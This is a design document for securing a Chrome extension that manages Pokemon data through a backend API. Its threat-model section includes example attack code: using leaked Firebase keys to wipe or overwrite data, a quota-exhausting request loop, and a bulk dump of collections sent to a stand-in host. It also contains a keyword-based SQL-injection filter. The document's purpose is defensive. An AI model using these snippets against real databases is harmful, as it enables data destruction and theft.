# Chrome Extension Security Architecture
## Pokemon Data Management System

**Date:** October 27, 2025  
**Project:** Chrome Extension for Pokemon Data & Movesets  
**Purpose:** Centralized data management with protection against unauthorized modifications

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [The Security Problem](#the-security-problem)
3. [Attack Vectors](#attack-vectors)
4. [Proposed Solution](#proposed-solution)
5. [Architecture Overview](#architecture-overview)
6. [Implementation Details](#implementation-details)
7. [Security Measures](#security-measures)
8. [Cost Analysis](#cost-analysis)
9. [Deployment Strategy](#deployment-strategy)

---

## Executive Summary

Chrome extensions are inherently client-side applications where all code is visible and modifiable by users. When managing centralized data that multiple users read and update, direct database access from the extension creates critical security vulnerabilities. This document outlines these risks and presents a secure architecture using a backend API layer to protect data integrity.

**Key Takeaway:** Never expose database credentials in client-side code. Always use a backend API as an intermediary.

---

## The Security Problem

### Chrome Extensions Are Transparent

Unlike traditional web applications, Chrome extensions have several characteristics that make them particularly vulnerable:

1. **Source Code is Publicly Accessible**
   - Users can navigate to `chrome://extensions/`
   - Enable "Developer mode"
   - Click "Service worker" or view extension files directly
   - All JavaScript, HTML, and configuration files are readable

2. **Code Cannot Be Hidden**
   - Minification and obfuscation provide minimal protection
   - Tools exist to beautify and reverse-engineer code
   - All API keys, endpoints, and logic are visible

3. **No Server-Side Protection**
   - Extensions run entirely in the user's browser
   - No server to validate requests before they reach the database
   - Users control the execution environment

### What Users Can Do

If database credentials are embedded in your extension, malicious users can:

- **Extract credentials** from the source code
- **Make direct API calls** to your database, bypassing your application logic
- **Modify data** without going through your intended workflows
- **Delete or corrupt** the entire database
- **Abuse your database quotas**, causing service disruption or unexpected costs
- **Create automated scripts** to spam your database with requests
- **Share credentials** with others, amplifying the attack

### Real-World Example

```javascript
// BAD: This code in your extension is visible to everyone
import { initializeApp } from 'firebase/app';

const firebaseConfig = {
  apiKey: "AIzaSyC-exposed-key-12345",  // ← EXPOSED!
  authDomain: "pokemon-data.firebaseapp.com",
  projectId: "pokemon-data",
  // ... more exposed credentials
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Anyone can now use these credentials to access your database directly
```

Even with Firebase Security Rules, users can:
- Exhaust your read/write quotas
- Make thousands of requests per second
- Access all readable data in bulk
- Potentially find vulnerabilities in your security rules

---

## Attack Vectors

### 1. Direct Database Manipulation

**Threat:** User extracts credentials and writes directly to database

**Example Attack:**
```javascript
// Attacker's script (run from browser console or external tool)
const stolenConfig = {
  apiKey: "AIzaSyC-exposed-key-12345",
  projectId: "pokemon-data"
};

const attackerApp = initializeApp(stolenConfig);
const attackerDb = getFirestore(attackerApp);

// Corrupt data
await setDoc(doc(attackerDb, 'pokemon', 'pikachu'), {
  name: "Hacked",
  stats: { hp: 9999, attack: 9999 }
});

// Or delete everything
const snapshot = await getDocs(collection(attackerDb, 'pokemon'));
snapshot.forEach(async (doc) => {
  await deleteDoc(doc.ref);
});
```

### 2. Quota Exhaustion Attack

**Threat:** Attacker makes unlimited requests to exhaust free tier or rack up costs

**Example Attack:**
```javascript
// Spam database with requests
while(true) {
  await getDocs(collection(db, 'pokemon'));
  // Your quota: 50,000 reads/day on free tier
  // This loop: 1000s of reads per minute
}
```

**Impact:** Your extension stops working for legitimate users once quota is exceeded.

### 3. Data Exfiltration

**Threat:** Bulk download all data for competing services

**Example Attack:**
```javascript
// Download entire database
const allCollections = ['pokemon', 'moves', 'items', 'user_submissions'];
const stolenData = {};

for (const collectionName of allCollections) {
  const snapshot = await getDocs(collection(db, collectionName));
  stolenData[collectionName] = snapshot.docs.map(doc => doc.data());
}

// Upload to competitor's service
await fetch('https://competitor.com/import', {
  method: 'POST',
  body: JSON.stringify(stolenData)
});
```

### 4. Logic Bypass

**Threat:** User circumvents validation rules implemented in extension

**Example:**
```javascript
// Your extension has validation logic
function submitMoveset(pokemonId, moveset) {
  if (moveset.moves.length !== 4) {
    throw new Error("Must have exactly 4 moves");
  }
  // Submit to database...
}

// Attacker bypasses this entirely
await addDoc(collection(db, 'movesets'), {
  pokemonId: 'pikachu',
  moves: ['move1', 'move2', 'move3', 'move4', 'move5', 'move6'], // Invalid!
  timestamp: new Date()
});
```

---

## Proposed Solution

### Backend API Layer Architecture

The solution is to introduce a backend server that acts as a gatekeeper between the Chrome extension and the database. The extension never has direct database access.

**Core Principle:** Trust nothing from the client. Validate everything on the server.

### Benefits

1. **Credentials Stay Secret**
   - Database credentials live only on the server
   - Users cannot extract or abuse them

2. **Server-Side Validation**
   - All data passes through your validation logic
   - Malicious or malformed data is rejected before reaching the database

3. **Rate Limiting**
   - Control how many requests each user/IP can make
   - Prevent quota exhaustion attacks

4. **Access Control**
   - Implement authentication and authorization
   - Track who is making what changes

5. **Audit Trail**
   - Log all requests for monitoring and debugging
   - Detect and respond to suspicious activity

6. **Flexibility**
   - Change database providers without updating the extension
   - Add new features without republishing to Chrome Web Store

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     Chrome Extension                         │
│                  (Client-Side - PUBLIC)                      │
│                                                              │
│  ┌────────────┐  ┌────────────┐  ┌─────────────┐          │
│  │  popup.js  │  │ content.js │  │ background  │          │
│  │            │  │            │  │   worker    │          │
│  └────────────┘  └────────────┘  └─────────────┘          │
│         │              │                │                   │
│         └──────────────┴────────────────┘                   │
│                        │                                     │
│                   API Calls                                  │
│              (HTTPS with auth token)                         │
└────────────────────────│──────────────────────────────────┘
                         │
                         ↓
         ┌───────────────────────────────┐
         │      Public Internet          │
         └───────────────────────────────┘
                         │
                         ↓
┌────────────────────────│──────────────────────────────────┐
│                  Backend Server                            │
│               (Node.js/Python/Go)                          │
│              PRIVATE - NOT ACCESSIBLE                      │
│                                                            │
│  ┌──────────────────────────────────────────────────┐    │
│  │              API Endpoints                        │    │
│  │  • GET  /api/pokemon          (public)          │    │
│  │  • GET  /api/moves            (public)          │    │
│  │  • POST /api/submit-moveset   (authenticated)   │    │
│  │  • POST /api/update-stats     (admin only)      │    │
│  └──────────────────────────────────────────────────┘    │
│                         │                                  │
│  ┌──────────────────────────────────────────────────┐    │
│  │          Middleware Layers                        │    │
│  │  • Rate Limiting (100 req/15min per IP)         │    │
│  │  • Authentication (verify user tokens)           │    │
│  │  • Validation (check data format)                │    │
│  │  • Logging (audit trail)                         │    │
│  └──────────────────────────────────────────────────┘    │
│                         │                                  │
│                         ↓                                  │
│  ┌──────────────────────────────────────────────────┐    │
│  │         Database Credentials                      │    │
│  │      (Environment Variables - SECRET)             │    │
│  │  • FIREBASE_SERVICE_ACCOUNT                      │    │
│  │  • DATABASE_URL                                   │    │
│  │  • API_SECRET_KEY                                 │    │
│  └──────────────────────────────────────────────────┘    │
└────────────────────────│──────────────────────────────────┘
                         │
                         ↓
         ┌───────────────────────────────┐
         │      Database Layer           │
         │   (Firebase/Supabase/SQL)     │
         │                               │
         │  ┌──────────┐  ┌──────────┐  │
         │  │ Pokemon  │  │  Moves   │  │
         │  │   Data   │  │   Data   │  │
         │  └──────────┘  └──────────┘  │
         │  ┌──────────┐  ┌──────────┐  │
         │  │  Items   │  │  User    │  │
         │  │   Data   │  │ Uploads  │  │
         │  └──────────┘  └──────────┘  │
         └───────────────────────────────┘
```

### Data Flow Example

**Reading Pokemon Data (Public):**
```
1. User opens extension popup
2. Extension calls: GET https://your-api.com/api/pokemon
3. Backend server receives request
4. Rate limiter checks: OK (under limit)
5. Server queries database using SECRET credentials
6. Server returns data to extension
7. Extension displays data to user
```

**Submitting Moveset (Authenticated):**
```
1. User submits custom moveset through extension UI
2. Extension gets user auth token (Chrome Identity API)
3. Extension calls: POST https://your-api.com/api/submit-moveset
   Headers: Authorization: Bearer <token>
   Body: { pokemonId: 25, moveset: [...] }
4. Backend receives request
5. Middleware authenticates token with Google
6. Middleware validates moveset format
7. Middleware checks rate limit
8. Server writes to database using SECRET credentials
9. Server returns success to extension
10. Extension shows confirmation to user
```

---

## Implementation Details

### 1. Backend Server (Node.js + Express)

```javascript
// server.js
const express = require('express');
const admin = require('firebase-admin');
const rateLimit = require('express-rate-limit');
const cors = require('cors');

// Initialize Firebase Admin SDK with SERVICE ACCOUNT
// This credential file NEVER goes in your extension
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  })
});

const db = admin.firestore();
const app = express();

// Middleware
app.use(express.json());
app.use(cors({
  origin: `chrome-extension://${process.env.EXTENSION_ID}`
}));

// Rate limiting - prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests, please try again later.'
});
app.use('/api/', limiter);

// Logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - ${req.ip}`);
  next();
});

// ============================================
// PUBLIC ENDPOINTS (no auth required)
// ============================================

app.get('/api/pokemon', async (req, res) => {
  try {
    const snapshot = await db.collection('pokemon').get();
    const pokemon = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()
    }));
    res.json({ success: true, data: pokemon });
  } catch (error) {
    console.error('Error fetching pokemon:', error);
    res.status(500).json({ success: false, error: 'Failed to fetch data' });
  }
});

app.get('/api/moves', async (req, res) => {
  try {
    const snapshot = await db.collection('moves').get();
    const moves = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()
    }));
    res.json({ success: true, data: moves });
  } catch (error) {
    console.error('Error fetching moves:', error);
    res.status(500).json({ success: false, error: 'Failed to fetch data' });
  }
});

// ============================================
// AUTHENTICATED ENDPOINTS
// ============================================

// Middleware to verify user authentication
async function verifyAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  
  const token = authHeader.split('Bearer ')[1];
  
  try {
    // Verify token with Firebase Auth
    const decodedToken = await admin.auth().verifyIdToken(token);
    req.user = decodedToken;
    next();
  } catch (error) {
    console.error('Auth error:', error);
    res.status(401).json({ success: false, error: 'Invalid token' });
  }
}

// Submit custom moveset
app.post('/api/submit-moveset', verifyAuth, async (req, res) => {
  const { pokemonId, moveset, description } = req.body;
  
  // Validation - all logic happens here, not in extension
  if (!pokemonId || !moveset) {
    return res.status(400).json({ 
      success: false, 
      error: 'Missing required fields' 
    });
  }
  
  if (!Array.isArray(moveset.moves) || moveset.moves.length !== 4) {
    return res.status(400).json({ 
      success: false, 
      error: 'Moveset must contain exactly 4 moves' 
    });
  }
  
  // Verify pokemon exists
  const pokemonDoc = await db.collection('pokemon').doc(pokemonId).get();
  if (!pokemonDoc.exists) {
    return res.status(404).json({ 
      success: false, 
      error: 'Pokemon not found' 
    });
  }
  
  // Verify moves exist
  for (const move of moveset.moves) {
    const moveDoc = await db.collection('moves').doc(move).get();
    if (!moveDoc.exists) {
      return res.status(400).json({ 
        success: false, 
        error: `Invalid move: ${move}` 
      });
    }
  }
  
  try {
    // Write to database - only server can do this
    const submission = {
      pokemonId,
      moveset,
      description: description || '',
      userId: req.user.uid,
      userEmail: req.user.email,
      timestamp: admin.firestore.FieldValue.serverTimestamp(),
      status: 'pending' // Requires admin approval
    };
    
    const docRef = await db.collection('moveset_submissions').add(submission);
    
    res.json({ 
      success: true, 
      submissionId: docRef.id,
      message: 'Moveset submitted for review'
    });
  } catch (error) {
    console.error('Error submitting moveset:', error);
    res.status(500).json({ success: false, error: 'Failed to submit moveset' });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

// Middleware to verify admin status
async function verifyAdmin(req, res, next) {
  if (!req.user) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  
  try {
    const userDoc = await db.collection('admins').doc(req.user.uid).get();
    if (!userDoc.exists) {
      return res.status(403).json({ success: false, error: 'Forbidden: Admin only' });
    }
    next();
  } catch (error) {
    console.error('Admin verification error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
}

// Approve moveset submission (admin only)
app.post('/api/admin/approve-moveset/:id', verifyAuth, verifyAdmin, async (req, res) => {
  const submissionId = req.params.id;
  
  try {
    const submissionDoc = await db.collection('moveset_submissions').doc(submissionId).get();
    
    if (!submissionDoc.exists) {
      return res.status(404).json({ success: false, error: 'Submission not found' });
    }
    
    const submission = submissionDoc.data();
    
    // Add to approved movesets
    await db.collection('approved_movesets').add({
      ...submission,
      approvedBy: req.user.uid,
      approvedAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    // Update submission status
    await db.collection('moveset_submissions').doc(submissionId).update({
      status: 'approved',
      approvedBy: req.user.uid,
      approvedAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    res.json({ success: true, message: 'Moveset approved' });
  } catch (error) {
    console.error('Error approving moveset:', error);
    res.status(500).json({ success: false, error: 'Failed to approve moveset' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

### 2. Chrome Extension (Client-Side)

```javascript
// background.js (service worker)

const API_BASE_URL = 'https://your-backend-api.com/api';

// Cache data locally to minimize API calls
let pokemonCache = null;
let cacheTimestamp = null;
const CACHE_DURATION = 24 * 60 * 60 * 1000; // 24 hours

// Fetch pokemon data (with caching)
async function fetchPokemon(forceRefresh = false) {
  // Check cache first
  if (!forceRefresh && pokemonCache && cacheTimestamp) {
    const cacheAge = Date.now() - cacheTimestamp;
    if (cacheAge < CACHE_DURATION) {
      console.log('Using cached pokemon data');
      return pokemonCache;
    }
  }
  
  try {
    const response = await fetch(`${API_BASE_URL}/pokemon`);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    
    if (result.success) {
      pokemonCache = result.data;
      cacheTimestamp = Date.now();
      
      // Store in chrome.storage for persistence
      await chrome.storage.local.set({
        pokemonData: result.data,
        cacheTimestamp: Date.now()
      });
      
      return result.data;
    } else {
      throw new Error(result.error || 'Failed to fetch pokemon');
    }
  } catch (error) {
    console.error('Error fetching pokemon:', error);
    
    // Fall back to cached data if available
    const stored = await chrome.storage.local.get(['pokemonData']);
    if (stored.pokemonData) {
      console.log('Using stored pokemon data as fallback');
      return stored.pokemonData;
    }
    
    throw error;
  }
}

// Submit moveset with authentication
async function submitMoveset(pokemonId, moveset, description) {
  try {
    // Get user authentication token
    const token = await getUserAuthToken();
    
    if (!token) {
      throw new Error('User not authenticated');
    }
    
    const response = await fetch(`${API_BASE_URL}/submit-moveset`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({
        pokemonId,
        moveset,
        description
      })
    });
    
    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(result.error || 'Failed to submit moveset');
    }
    
    return result;
  } catch (error) {
    console.error('Error submitting moveset:', error);
    throw error;
  }
}

// Get user authentication token using Chrome Identity API
async function getUserAuthToken() {
  return new Promise((resolve, reject) => {
    chrome.identity.getAuthToken({ interactive: true }, (token) => {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve(token);
      }
    });
  });
}

// Listen for messages from popup/content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'getPokemon') {
    fetchPokemon(request.forceRefresh)
      .then(data => sendResponse({ success: true, data }))
      .catch(error => sendResponse({ success: false, error: error.message }));
    return true; // Keep channel open for async response
  }
  
  if (request.action === 'submitMoveset') {
    submitMoveset(request.pokemonId, request.moveset, request.description)
      .then(result => sendResponse(result))
      .catch(error => sendResponse({ success: false, error: error.message }));
    return true;
  }
});

// Initialize on install
chrome.runtime.onInstalled.addListener(async () => {
  console.log('Extension installed, fetching initial data...');
  try {
    await fetchPokemon(true);
    console.log('Initial data loaded successfully');
  } catch (error) {
    console.error('Failed to load initial data:', error);
  }
});
```

```javascript
// popup.js

// Load and display pokemon
async function loadPokemon() {
  const loadingDiv = document.getElementById('loading');
  const errorDiv = document.getElementById('error');
  const pokemonList = document.getElementById('pokemon-list');
  
  loadingDiv.style.display = 'block';
  errorDiv.style.display = 'none';
  
  try {
    // Request data from background script
    const response = await chrome.runtime.sendMessage({ 
      action: 'getPokemon' 
    });
    
    if (response.success) {
      displayPokemon(response.data);
    } else {
      throw new Error(response.error);
    }
  } catch (error) {
    console.error('Error loading pokemon:', error);
    errorDiv.textContent = `Error: ${error.message}`;
    errorDiv.style.display = 'block';
  } finally {
    loadingDiv.style.display = 'none';
  }
}

// Handle moveset submission
async function handleMovesetSubmit(event) {
  event.preventDefault();
  
  const pokemonId = document.getElementById('pokemon-select').value;
  const moves = [
    document.getElementById('move1').value,
    document.getElementById('move2').value,
    document.getElementById('move3').value,
    document.getElementById('move4').value
  ];
  const description = document.getElementById('description').value;
  
  const submitButton = document.getElementById('submit-btn');
  const statusDiv = document.getElementById('status');
  
  submitButton.disabled = true;
  statusDiv.textContent = 'Submitting...';
  
  try {
    const response = await chrome.runtime.sendMessage({
      action: 'submitMoveset',
      pokemonId: pokemonId,
      moveset: { moves },
      description: description
    });
    
    if (response.success) {
      statusDiv.textContent = 'Moveset submitted successfully! It will be reviewed by our team.';
      statusDiv.className = 'status success';
      document.getElementById('moveset-form').reset();
    } else {
      throw new Error(response.error);
    }
  } catch (error) {
    console.error('Error submitting moveset:', error);
    statusDiv.textContent = `Error: ${error.message}`;
    statusDiv.className = 'status error';
  } finally {
    submitButton.disabled = false;
  }
}

// Initialize popup
document.addEventListener('DOMContentLoaded', () => {
  loadPokemon();
  document.getElementById('moveset-form').addEventListener('submit', handleMovesetSubmit);
});
```

### 3. Environment Variables (.env file - NEVER commit to git)

```bash
# .env (on server only - add to .gitignore)
PORT=3000

# Firebase Admin SDK
FIREBASE_PROJECT_ID=your-project-id
FIREBASE_CLIENT_EMAIL=firebase-adminsdk@your-project.iam.gserviceaccount.com
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYourPrivateKeyHere\n-----END PRIVATE KEY-----\n"

# Chrome Extension ID (for CORS)
EXTENSION_ID=your-chrome-extension-id

# Optional: API key for additional security
API_SECRET_KEY=your-secret-key-here
```

### 4. Deployment Configuration

```yaml
# railway.toml (for Railway deployment)
[build]
builder = "NIXPACKS"

[deploy]
startCommand = "npm start"
restartPolicyType = "ON_FAILURE"
restartPolicyMaxRetries = 10
```

```json
// package.json
{
  "name": "pokemon-extension-backend",
  "version": "1.0.0",
  "description": "Backend API for Pokemon Chrome Extension",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "firebase-admin": "^12.0.0",
    "express-rate-limit": "^7.1.5",
    "cors": "^2.8.5",
    "dotenv": "^16.3.1"
  },
  "devDependencies": {
    "nodemon": "^3.0.2"
  }
}
```

---

## Security Measures

### 1. Rate Limiting

**Purpose:** Prevent abuse and quota exhaustion

**Implementation:**
- 100 requests per 15 minutes per IP address
- Separate limits for authenticated vs. public endpoints
- Progressive penalties for repeat offenders

**Code:**
```javascript
const strictLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests. Please try again later.'
    });
  }
});
```

### 2. Authentication & Authorization

**Three-Tier Access:**

1. **Public** (no auth required)
   - Read-only access to pokemon/moves/items data
   - Rate limited to prevent abuse

2. **Authenticated Users** (Chrome Identity API)
   - Can submit movesets for review
   - Personal data access
   - Higher rate limits

3. **Admins** (special permission)
   - Can approve/reject submissions
   - Can modify core data
   - Audit log access

**Implementation:**
```javascript
// Authentication hierarchy
const accessLevels = {
  public: 0,
  user: 1,
  admin: 2
};

function requireAccess(level) {
  return async (req, res, next) => {
    if (level === accessLevels.public) {
      return next();
    }
    
    if (level === accessLevels.user) {
      if (req.user) return next();
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    if (level === accessLevels.admin) {
      if (req.user && req.user.isAdmin) return next();
      return res.status(403).json({ error: 'Admin access required' });
    }
  };
}
```

### 3. Input Validation

**Server-Side Validation (Critical):**

```javascript
// Validate all inputs - never trust client
function validateMoveset(moveset) {
  const errors = [];
  
  // Check structure
  if (!moveset || typeof moveset !== 'object') {
    errors.push('Invalid moveset format');
    return errors;
  }
  
  // Check moves array
  if (!Array.isArray(moveset.moves)) {
    errors.push('Moves must be an array');
  } else if (moveset.moves.length !== 4) {
    errors.push('Must have exactly 4 moves');
  } else {
    // Validate each move
    moveset.moves.forEach((move, index) => {
      if (typeof move !== 'string' || move.trim() === '') {
        errors.push(`Invalid move at position ${index + 1}`);
      }
      if (move.length > 50) {
        errors.push(`Move name too long at position ${index + 1}`);
      }
    });
  }
  
  // Check for SQL injection patterns
  const sqlInjectionPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)/i;
  if (sqlInjectionPattern.test(JSON.stringify(moveset))) {
    errors.push('Invalid characters detected');
  }
  
  return errors;
}
```

### 4. Audit Logging

**Track all data modifications:**

```javascript
// Audit middleware
async function auditLog(req, res, next) {
  const logEntry = {
    timestamp: new Date(),
    ip: req.ip,
    method: req.method,
    path: req.path,
    userId: req.user ? req.user.uid : 'anonymous',
    userAgent: req.get('user-agent')
  };
  
  // Log to database
  await db.collection('audit_logs').add(logEntry);
  
  next();
}

app.use('/api/submit-moveset', auditLog);
app.use('/api/admin/', auditLog);
```

### 5. CORS Protection

**Only allow requests from your extension:**

```javascript
const cors = require('cors');

app.use(cors({
  origin: (origin, callback) => {
    // Allow your extension
    const allowedOrigins = [
      `chrome-extension://${process.env.EXTENSION_ID}`,
      'http://localhost:3000' // For development
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

### 6. Environment Variables

**Never hardcode secrets:**

```javascript
// BAD - visible in code
const apiKey = "AIzaSyC-exposed-key";

// GOOD - loaded from environment
const apiKey = process.env.FIREBASE_API_KEY;

// Verify critical env vars exist
if (!process.env.FIREBASE_PROJECT_ID || !process.env.FIREBASE_PRIVATE_KEY) {
  console.error('Missing required environment variables');
  process.exit(1);
}
```

### 7. HTTPS Only

**Enforce encrypted connections:**

```javascript
// Redirect HTTP to HTTPS in production
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});
```

### 8. Error Handling

**Don't leak sensitive information:**

```javascript
// BAD - exposes internals
app.get('/api/pokemon', async (req, res) => {
  const data = await db.query('SELECT * FROM pokemon');
  res.json(data);
});

// GOOD - sanitized errors
app.get('/api/pokemon', async (req, res) => {
  try {
    const data = await db.query('SELECT * FROM pokemon');
    res.json({ success: true, data });
  } catch (error) {
    console.error('Database error:', error); // Log internally
    res.status(500).json({ 
      success: false, 
      error: 'Failed to fetch data' // Generic message to user
    });
  }
});
```

---

## Cost Analysis

### Backend Hosting

**Railway (Recommended for beginners):**
- Free tier: $5 credit/month (500 hours)
- Paid: $5/month for 500 hours
- Auto-scaling available

**Render:**
- Free tier: Available (with limitations)
- Paid: $7/month starter

**Google Cloud Run:**
- Free tier: 2 million requests/month
- Pay-per-use after that
- Best for high traffic

**Vercel (Serverless):**
- Free tier: Generous
- Pro: $20/month if needed

### Database Costs

**Firebase Firestore:**
- Free tier: 50K reads/day, 20K writes/day
- Cost beyond: $0.06 per 100K reads
- With caching: ~$0-5/month for most extensions

**Supabase:**
- Free tier: 500MB database, unlimited API requests
- Paid: $25/month for more storage/compute

### Total Monthly Cost Estimate

**Small extension (< 1,000 users):**
- Backend: $0 (free tier)
- Database: $0 (free tier)
- **Total: $0/month**

**Medium extension (1,000 - 10,000 users):**
- Backend: $5-7/month
- Database: $0-5/month
- **Total: $5-12/month**

**Large extension (10,000+ users):**
- Backend: $20-50/month (depending on requests)
- Database: $10-25/month
- **Total: $30-75/month**

**Break-even analysis:**
- Free tier sustainable up to ~5,000 daily active users
- Cost scales linearly with usage
- Caching reduces costs by 80-90%

---

## Deployment Strategy

### Phase 1: Development (Week 1)

1. **Set up backend server locally**
   - Initialize Node.js project
   - Install dependencies
   - Create basic API endpoints
   - Test with Postman/curl

2. **Configure database**
   - Set up Firebase/Supabase project
   - Create collections/tables
   - Import initial pokemon data
   - Configure security rules

3. **Develop Chrome extension**
   - Create manifest.json
   - Implement API calls to localhost
   - Build UI components
   - Test data flow

### Phase 2: Testing (Week 2)

1. **Security testing**
   - Attempt to extract credentials (should fail)
   - Test rate limiting
   - Verify authentication
   - Check input validation

2. **Load testing**
   - Simulate 100+ concurrent users
   - Monitor API response times
   - Check database query performance
   - Optimize slow endpoints

3. **Beta testing**
   - Deploy to staging environment
   - Invite 10-20 beta testers
   - Collect feedback
   - Fix bugs

### Phase 3: Production Deployment (Week 3)

1. **Deploy backend**
   - Choose hosting platform (Railway recommended)
   - Configure environment variables
   - Set up custom domain (optional)
   - Enable HTTPS
   - Configure monitoring/alerts

2. **Deploy extension**
   - Update API URL to production
   - Submit to Chrome Web Store
   - Wait for review (1-3 days typically)

3. **Monitor launch**
   - Watch error logs
   - Monitor rate limit hits
   - Check database costs
   - Respond to user feedback

### Phase 4: Maintenance (Ongoing)

1. **Weekly tasks**
   - Review audit logs
   - Check error rates
   - Monitor costs
   - Review user submissions

2. **Monthly tasks**
   - Update pokemon data
   - Analyze usage patterns
   - Optimize slow queries
   - Security updates

3. **As needed**
   - Scale infrastructure
   - Add new features
   - Fix security vulnerabilities
   - Respond to abuse reports

---

## Quick Start Checklist

### Backend Setup

- [ ] Create Firebase/Supabase account
- [ ] Initialize Node.js project: `npm init -y`
- [ ] Install dependencies: `npm install express firebase-admin cors express-rate-limit dotenv`
- [ ] Create `server.js` with API endpoints
- [ ] Create `.env` file with credentials
- [ ] Add `.env` to `.gitignore`
- [ ] Test locally: `node server.js`
- [ ] Deploy to Railway/Render
- [ ] Verify production deployment

### Chrome Extension Setup

- [ ] Create extension directory structure
- [ ] Create `manifest.json` with permissions
- [ ] Implement API calls in background script
- [ ] Build popup UI
- [ ] Configure Chrome Identity API (if using auth)
- [ ] Test with `chrome://extensions/` in developer mode
- [ ] Update API URLs to production
- [ ] Prepare screenshots and description
- [ ] Submit to Chrome Web Store
- [ ] Wait for approval

### Security Verification

- [ ] Confirm no credentials in extension code
- [ ] Test rate limiting works
- [ ] Verify authentication required for write endpoints
- [ ] Check CORS blocks unauthorized origins
- [ ] Validate input sanitization
- [ ] Test error handling doesn't leak info
- [ ] Enable audit logging
- [ ] Set up monitoring alerts

---

## Conclusion

Chrome extensions require special security considerations due to their transparent nature. By implementing a backend API layer, you create a secure barrier between users and your database, ensuring data integrity, preventing abuse, and maintaining control over your application.

**Key Takeaways:**

1. **Never expose database credentials** in client-side code
2. **Always validate and sanitize** inputs server-side
3. **Implement rate limiting** to prevent abuse
4. **Use authentication** for write operations
5. **Monitor and log** all activity
6. **Cache aggressively** to reduce costs
7. **Plan for scale** from the beginning

While this architecture adds complexity compared to direct database access, it's the **only secure approach** for a production Chrome extension managing centralized data. The cost ($0-12/month for most cases) is minimal compared to the security and control benefits.

---

## Additional Resources

- [Firebase Admin SDK Documentation](https://firebase.google.com/docs/admin/setup)
- [Chrome Extension Development Guide](https://developer.chrome.com/docs/extensions/mv3/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Railway Deployment Guide](https://docs.railway.app/)

---

**Document Version:** 1.0  
**Last Updated:** October 27, 2025  
**Next Review:** November 27, 2025
